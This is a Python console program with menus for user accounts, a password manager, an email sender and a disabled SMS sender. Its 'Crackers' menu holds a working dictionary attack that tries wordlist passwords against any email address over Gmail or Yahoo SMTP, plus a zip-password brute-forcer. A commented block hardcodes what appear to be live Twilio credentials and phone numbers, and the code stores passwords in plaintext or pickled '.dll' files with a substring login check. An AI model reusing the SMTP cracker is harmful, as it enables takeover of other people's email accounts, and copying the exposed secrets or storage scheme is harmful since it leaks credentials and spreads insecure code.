from time import sleep
#from twilio.rest import TwilioRestClient
import os, io, sys, smtplib, random, pickle, zipfile
class Users():
    def __init__(self):
        self.username = ""
        self.password = ""
        self.manage = ""
        self.passwords = {}
    def options(self):
        while True:
            welcome = input(self.username+"'s options as {user}: Launch [C]rackers, [L]aunch editing programs, launch [S]ender, launch [P]assword management, [M]anage account or [E]xit? ")
            if welcome == "C" or welcome == "c":
                while True:
                    hwo = input("[L]aunch email cracker, [Z]ip cracker, or [E]xit")
                    if hwo == "L" or hwo == "l":
                        print("Loading. . .")
                        sleep(4)
                        print("Welcome!")
                        smtpserver = smtplib.SMTP("smtp."+input("Enter mail provider (gmail or mail.yahoo): ")+".com", 587)
                        smtpserver.ehlo()
                        smtpserver.starttls()
                        user = input("Enter address: ")
                        passwfile = input("Enter password dictionary: ")
                        if os.path.isfile(passwfile) == True:
                            passwfile = open(passwfile, "r")
                            for password in passwfile:
                                try:
                                    smtpserver.login(user, password)
                                    print("[+] Password Tried; Password Found: %s" % password)
                                    break
                                except smtplib.SMTPAuthenticationError:
                                    print("[-] Password Tried; Incorrect: %s" % password)
                        else:
                            print("Unknown Password Dictionary")
                    elif hwo == "Z" or hwo == "z":
                        zipfilename = input("Enter zfile name: ")
                        dictionary = input("Enter dictionary: ")
                        password = None
                        zip_file = zipfile.ZipFile(zipfilename)
                        with open(dictionary, 'r') as f:
                            for line in f.readlines():
                                password = line.strip('\n')
                                try:
                                    zip_file.extractall(pwd=password)
                                    password = "[+] Password found: %s" % password
                                except:
                                    print("[-] Password failed: %s" % password)
                        print(password)
            elif welcome == "M" or welcome == "m":
                while True:
                    where = input("[D]elete Account, change [P]assword, change [U]sername, or [E]xit? ")
                    if where == "D" or where == "d":
                        confirm = input("Are you sure that you want to delete your account? All personal data and software will be lost. Enter your password to delete account: ")
                        if confirm == self.password:
                            os.remove(self.username+".dll")
                            print("Account Deletion Successful.")
                            person.whereto()
                            break
                        else:
                            print("Account Deletion Failed.")
                    elif where == "P" or where == "p":
                        passwor = input("Enter current password: ")
                        if passwor == self.password:
                            old_password = input("Enter new password: ")
                            self.password = old_password
                            os.remove(self.username+".dll")
                            hgt = self.username+".dll"
                            with open(hgt, "w") as x:
                                x.write(self.password)
                                os.system("cls")
                                print("Password Successfully Changed!")
                        else:
                            print("Incorrect Password. Password change failed.")
                    elif where == "U" or where == "u":
                        new_username = input("Enter new username: ")
                        if os.path.isfile(new_username+".dll") == False:
                            confirm = input("Enter Password: ")
                            if confirm == self.password:
                                os.rename(self.username+".dll", new_username+".dll")
                                self.username = new_username
                                print("Username change successful!")
                            else:
                                print("Incorrect Password. Username change failed.")
                        else:
                            print("That username is already in use!")
                    elif where == "E" or where == "e":
                        break
            elif welcome == "L" or welcome == "l":
                while True:
                    who = input("Run [P]ython editor, run [T]ext editor, or [E]xit? ")
                    if who == "P" or who == "p":
                        confirm = input("This program uses a GUI. Do you stil want to use it (y/n): ")
                        if confirm == "Y" or confirm == "y":
                            print("Put editor here.")
                        elif confirm == "N" or confirm == "n":
                            print("Python editor failed to launch")
                    elif who == "T" or who == "t":
                        print("Running Text editor. . .")
                        print("Broken! Sorry!")
                    elif who == "E" or who == "e":
                        break
            elif welcome == "S" or welcome == "s":
                while True:
                    where = input("Send [E]mail, send [S]MS Message, or [L]eave?  ")
                    if where == "E" or where == "e":
                        print("The current version of this program only allows gmail users to send emails.")
                        mail = smtplib.SMTP("smtp.gmail.com", 587)
                        mail.ehlo()
                        mail.starttls()
                        sender = input("Enter your email: ")
                        try:
                            mail.login(sender, input("Enter password: "))
                            subject = input("Enter email subject: ")
                            body = input("Enter email body: ")
                            recipient = input("Enter recipient: ")
                            stuff = "Subject: "+subject+"\n"+body
                            mail.sendmail(sender,recipient,stuff)
                            mail.close()
                            print("Email Sent!")
                        except smtplib.SMTPAuthenticationError:
                            print("Incorrect Password.")
                    elif where == "S" or where == "s":
                        print("Broken! Sorry!")
                        '''
                        accountSID = "ACe720baa9e626dfca8768f5e7775c47ac"
                        authToken = "63c394a6f48ec86d6f6366fd321fbf04"
                        twilioCli = TwilioRestClient(accountSID, authToken)
                        myTwilioNumber = "+19143713266"
                        myCellPhone = "+19144142874"
                        message = twilioCli.messages.create(body=input("Enter Message: "), from_=myTwilioNumber, to=myCellPhone)
                        print("Message Sent!")
                        '''
                    elif where == "L" or where == "l":
                        break
            elif welcome == "P" or welcome == "p":
                while True:
                    if os.path.isfile(self.username+"PASS.dll") == True:
                        check = input("Enter main password: ")
                        if check == self.manage:
                            while True:
                                why = input("[V]iew passwords, [A]dd password, [M]anage account, or [E]xit? ")
                                if why == "V" or why == "v":
                                    print(self.passwords.keys())
                                elif why == "A" or why == "a":
                                        newKey = input("Enter website for password: ")
                                        newValue = input("Enter password: ")
                                        self.passwords[newKey] = newValue
                                elif why == "M" or why == "m":
                                    while True:
                                        where = input("[C]hange password, [D]elete account, or [E]xit? ")
                                        if where == "C" or where == "c":
                                            confirm = input("Enter current password: ")
                                            if confirm == self.manage:
                                                newpw = input("Enter new password: ")
                                                self.manage = newpw
                                                os.remove(self.username+"PASS.dll")
                                                htg = self.username+"PASS.dll"
                                                with open(htg, "w") as x:
                                                    x.write(self.manage)
                                                    os.system("cls")
                                                    print("Password Successfully Changed!")
                                            else:
                                                print("Incorrect Password!")
                                        elif where == "D" or where == "d":
                                            confirm = input("Are you sure you want to delete your account? All passwords will be removed forever. Enter password to delete account: ")
                                            if confirm == self.password:
                                                os.remove(self.username+"PASS.dll")
                                                os.system("cls")
                                                print("Account successfully deleted.")
                                                break
                                            else:
                                                print("Incorrect Password. Account deletion failed.")
                                        elif where == "E" or where == "e":
                                            person.options()
                                            break
                                elif why == "E" or why == "e":
                                    break
                    else:
                        registerq = input("You have not registered a password management account! Would you like to register one now (y/n)? ")
                        if registerq == "Y" or registerq == "y":
                            setPw = input("Enter a password-management password: ")
                            self.manage = setPw
                            htg = self.username+"PASS.dll"
                            with open(htg, "w") as x:
                                x.write(setPw)
                            os.system("cls")
                            print("Password management account created.")
                        else:
                            print("Password-management account creation failed.")
                            break
            elif welcome == "E" or welcome == "e":
                break
    def register(self):
        self.username = input("Enter a username: ")
        self.password = input("Enter a password: ")
        if os.path.isfile(self.username+".dll") == False:
            htg = self.username+".dll"
            with open(htg, "wb") as file:
                pickle.dump(self.password, file)
                os.system("cls")
                print("Account successfully created!")
        else:
            print("That username is already taken!")
    def login(self):
        while True:
            enter_username = input("Enter your username: ")
            enter_password = input("Enter your password: ")
            if os.path.isfile(enter_username+".dll") == True:
                p = enter_username+".dll"
                with open(p,"rb") as i:
                    x = pickle.load(i)
                    if enter_password in x:
                        self.username = enter_username
                        self.password = x
                        os.system("cls")
                        print("Correct username and password!")
                        person.options()
                        break
                    else:
                        print("Unknown Account Information!")
                        person.whereto()
                        break
            else:
                print("Unknown Account Information!")
                person.whereto()
                break
    def whereto(self):
        while True:
            welcome = input("[L]ogin, [R]egister, or [E]xit? ")
            if welcome == "L" or welcome == "l":
                person.login()
            elif welcome == "R" or welcome == "r":
                person.register()
            elif welcome == "E" or welcome == "e":
                break
person = Users()
person.whereto()
